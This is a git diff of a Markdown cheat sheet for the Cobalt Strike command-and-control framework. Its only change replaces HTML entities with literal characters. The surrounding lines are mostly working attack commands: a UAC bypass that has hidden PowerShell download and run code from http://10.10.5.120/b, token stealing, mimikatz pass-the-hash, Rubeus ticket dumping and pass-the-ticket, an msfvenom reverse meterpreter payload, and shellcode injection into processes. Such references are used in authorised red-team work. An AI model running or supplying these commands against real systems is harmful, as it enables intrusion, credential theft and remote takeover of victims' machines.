@@ -19,7 +19,7 @@ The beacons of these listeners don't need to talk to the C2 directly, they can c
 
 #### Generate payloads in files
 
-`Attacks -> Packages ->`&#x20;
+`Attacks -> Packages ->`
 
 * **`HTMLApplication`** for HTA files
 * **`MS Office Macro`** for an office document with a macro
@@ -37,7 +37,7 @@ If you already has the file you want to host in a web sever just go to `Attacks 
 ### Beacon Options
 
 <pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
-execute-assembly &#x3C;/path/to/executable.exe>
+execute-assembly </path/to/executable.exe>
 
 # Screenshots
 printscreen    # Take a single screenshot via PrintScr method
@@ -56,7 +56,7 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 # Powershell
 # Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;just write powershell cmd here>
+powershell <just write powershell cmd here>
 
 # User impersonation
 ## Token generation with creds
@@ -66,14 +66,14 @@ rev2self # Stop using token generated with make_token
 ## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.
 
 # UAC Bypass
-elevate svc-exe &#x3C;listener>
-elevate uac-token-duplication &#x3C;listener>
+elevate svc-exe <listener>
+elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Steal token from pid
 ## Like make_token but stealing the token from a process
 steal_token [pid] # Also, this is useful for network actions, not local actions
-## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated &#x3C;current_username> - it's impersonating our own cloned token.
+## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
 ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
 rev2self # Stop using token from steal_token
 
@@ -91,36 +91,36 @@ pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
-mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
+mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
 ## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
-steal_token &#x3C;pid> #Steal token from process created by mimikatz
+steal_token <pid> #Steal token from process created by mimikatz
 
 ## Pass the ticket
 ## Request a ticket
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
-make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session &#x26; load it
+make_token <domain>\<username> DummyPass
+## Write the ticket in the attacker machine from a poweshell session & load it
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
 ## Pass the ticket from SYSTEM
 ## Generate a new process with the ticket
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
 ## Steal the token from that process
-steal_token &#x3C;pid>
+steal_token <pid>
 
 ## Extract ticket + Pass the ticket
 ### List tickets
 execute-assembly C:\path\Rubeus.exe triage
 ### Dump insteresting ticket by luid
-execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### Create new logon session, note luid and processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### Insert ticket in generate logon session
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
 ### Finally, steal the token from that new process
-steal_token &#x3C;pid>
+steal_token <pid>
 
 # Lateral Movement
 ## If a token was created it will be used
@@ -157,12 +157,12 @@ beacon> spawn metasploit
 
 # Pass session to Metasploit - Through shellcode injection
 ## On metasploit host
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Run msfvenom and prepare the multi/handler listener
 
 ## Copy bin file to cobalt strike host
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
+shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
 
 # Pass metasploit session to cobalt strike
 ## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
